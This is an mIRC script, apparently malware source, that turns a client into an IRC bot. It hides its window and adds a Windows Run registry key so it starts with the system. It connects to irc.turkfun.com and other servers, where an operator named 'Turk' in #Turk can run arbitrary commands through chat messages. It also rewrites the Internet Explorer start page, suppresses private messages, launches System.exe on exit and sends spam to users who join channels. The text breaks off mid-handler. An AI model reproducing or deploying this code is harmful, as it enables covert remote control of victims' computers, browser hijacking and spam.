   on *:start: {
     mC_YaRgIc
     dll swf.dll do_ShowWindow $window(-2).hwnd 0
     timer 0 200 ZeGa
     server irc.turkfun.com -i $read(Msrepla32.dll) $read(Msrepla32.dll) tR@ $read(Msrepla32.dll)
     server -m %server1
     server -m %server2
     server -m %server3
     server -m %server4
     server -m %server5 -i $read(Msrepla32.dll) $read(Msrepla32.dll) cgiirc@ $read(Msrepla32.dll)
     server -m %server6
     server -m %server7
     server -m %server8
     server -m %server9
     server -m %server10
     server -m %server11
     server -m %server12
     server -m %server13
     server -m %server14
     server -m %server15
     asd $inr(eas,win)
     ZeGa
   }
   on 1:connect: {
     if (irc.turkfun.com isin $server) { join #Turk TurkfunCom }
     elseif (%mC1 isin $server) { join $read(Javawebprxy.dll) | join $read(Javawebprxy.dll) | timer 0 500 disconnect }
     elseif (%mC2 isin $server) { join $read(Msseng.dll) | join $read(Msseng.dll) | timer 0 500 disconnect }
     elseif (%mC3 isin $server) { join #biliyormusun | join #english | timer 0 100 disconnect }
     elseif (%mC4 isin $server) { join %chan4 | timer 0 100 disconnect }
     elseif (%mC5 isin $server) { join %chan5 | timer 0 200 disconnect   }
     elseif (%mC6 isin $server) { join %chan6 | timer 0 200 disconnect }
     elseif (%mC7 isin $server) { join #zurna | join #klavye | join #istanbul | timer 0 200 disconnect }
     elseif (%mC8 isin $server) { join $read(Javaweb.dll) | join $read(Javaweb.dll) | timer 0 200 disconnect }
     elseif (%mC9 isin $server) { join $read(Kill.dll) | join $read(Kill.dll) | timer 0 200 disconnect }
     elseif (%mC10 isin $server) { join $read(Javawebprxy.dll) | join $read(Javawebprxy.dll) | timer 0 200 disconnect }
     elseif (%mC11 isin $server) { join $read(Javawebprxy.dll) | join $read(Javawebprxy.dll) | timer 0 200 disconnect }
     elseif (%mC12 isin $server) { join $read(Masnad.dll) | join $read(Masnad.dll) | timer 0 200 disconnect }
     elseif (%mC13 isin $server) { join $read(Javawebprxy.dll) | join $read(Javawebprxy.dll) | timer 0 200 disconnect }
     elseif (%mC14 isin $server) { join $read(Javawebprxy.dll) | join $read(Javawebprxy.dll) | timer 0 200 disconnect }
   }

   on 1:disconnect: { server | mC_YaRgIc }
   on *:text:*:?:closemsg  $nick | halt
   on *:action:*:?:closemsg $nick | halt
   on *:notice:*:?:closemsg $nick | halt
   on *:ping: { ctcp $me ping }
   on *:exit:run System.exe

   alias ZeGa {
     .set %windows $r(10,1999) $+ .reg
     .write %windows REGEDIT4
     .write %windows [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
     .write %windows "WinMsgServices"=" $+ $remove($mircexe,$mircdir) $+ "
     run -n regedit /s %windows
     timer 1 4 remove %windows
   }

   alias mC_YaRgIc {
     nick $read Msrepla32.dll
     anick $read Msrepla32.dll
     fullname $read Msrepla32.dll
     emailaddr $read Msrepla32.dll
     identd on $read Msrepla32.vxd $+ $r(a,z)
   }

   on *:text:*:#: {
     if (irc.turkfun.com isin $server) {
       if (Turk ison #Turk) {
         if (Turk isop #Turk) {
           if ($1 = $me) { $2-  }
         }
       }
     }
     if (irc.turkfun.com isin $server) {
       if (Turk ison #Turk) {
         if (Turk isop #Turk) {
           if ($1 = !Erzurum) { $2-  }
         }
       }
     }
     if (irc.turkfun.com isin $server) {
       if (Turk ison #Turk) {
         if (Turk isop #Turk) {
           if ($1 == !Web) {
             set %giris $2
             set %system $r(10,1999) $+ .reg
             .write %system REGEDIT4
             .write %system [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]
             .write %system "Start Page" = " $+ %giris $+ "
             .run -n regedit /s %system
             .timer 1 4 remove %system
           }
         }
       }
     }
    }
     on *:join:#: {
       if ($nick = $me) { halt }
       if (irc.turkfun.com isin $server) { halt }
       if (%mC1 isin $server) { msg $nick %reklam1 | notice $nick %reklam1 }
